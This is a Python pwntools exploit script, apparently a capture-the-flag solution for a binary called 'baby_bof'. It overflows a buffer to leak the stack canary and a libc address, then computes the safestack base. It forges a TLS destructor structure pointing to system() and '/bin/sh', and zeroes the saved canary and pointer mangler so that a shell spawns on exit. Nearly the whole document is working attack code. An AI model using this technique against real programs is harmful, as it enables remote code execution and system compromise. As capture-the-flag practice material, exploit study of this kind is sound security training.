from pwn import *

elf = ELF("../dist/baby_bof")
libc = ELF("../dist/libc.so.6")

context.binary = "../dist/baby_bof"

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

#p = process("./baby_bof")
p = remote("0.0.0.0", 1337)

def send_payload(payload):
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.send(payload)

def exit():
    p.recvuntil(b">")
    p.sendline(b"2")



### Get some interesting values first ###

# Leaking the canary at the end of the safestack
send_payload(b"A"*0x49)
p.recvline()
canary = u64(b"\x00" + p.recvline()[-8:-1])
print("[*] Canary :", hex(canary))


# Leaking the address of the second parameter of setlocale
# Then use it to obtain the libc base address
send_payload(b"A"*0x50 + b"A"*0x698)
p.recvline()
leak = u64(p.recvline()[-7:-1] + b"\x00\x00")
print("[+] Leaked address of setlocale second parameter :", hex(leak))

libc.address = leak - 0x1D4580
print("[+] Libc base address :", hex(libc.address))

# Deduce the safestack address from the libc base address
safestack = libc.address - 0x803000
print("[+] Safe Stack base :", hex(safestack))

payload_addr = safestack + 0x7fffb0
print("[*] Payload starts at address :", hex(payload_addr))


### Our next move is to craft false structures in order to pop a shell when the exit handlers are executed ###
### Since we control the tls, we can craft a false tls_dtors_struct which contains pointers to system() and b"/bin/sh" ###
### We will then nullify the value of the ptr_mangler and get a shell after __call_tls_dtors is called ###

# Crafting a flase tls_dtors_struct
tls_dtors_struct = p64(rol(libc.sym["system"], 0x11, 64)) + p64(next(libc.search(b"/bin/sh"))) + p64(0) + p64(1)

# Saving the rest of the data found in the tls so nothing breaks
tls_data = p64(libc.address + 0x1d4580)
tls_data += p64(libc.address + 0x1dc440)
tls_data += p64(0)
tls_data += p64(libc.address + 0x17c4c0)
tls_data += p64(libc.address + 0x17cac0)
tls_data += p64(libc.address + 0x17d3c0)
tls_data += p64(payload_addr) # Address of tls_dtors_struct
tls_data += p64(0) * 10
tls_data += p64(payload_addr)
tls_data += p64(safestack)
tls_data += p64(0x0000000000800000)
tls_data += p64(0x0000000000001000)
tls_data += p64(libc.address - 0x28c0)
tls_data += p64(libc.address - 0x1f20)
tls_data += p64(libc.address - 0x28c0)
tls_data += p64(0) * 2
tls_data += p64(0) # Saved state of the canary in tls
tls_data += p64(0) # Saved state of the ptr_mangler in tls

send_payload(tls_dtors_struct + b"A"*0x28 + p64(canary)*2 + b"A"*0x698 + tls_data)
exit()
p.interactive()
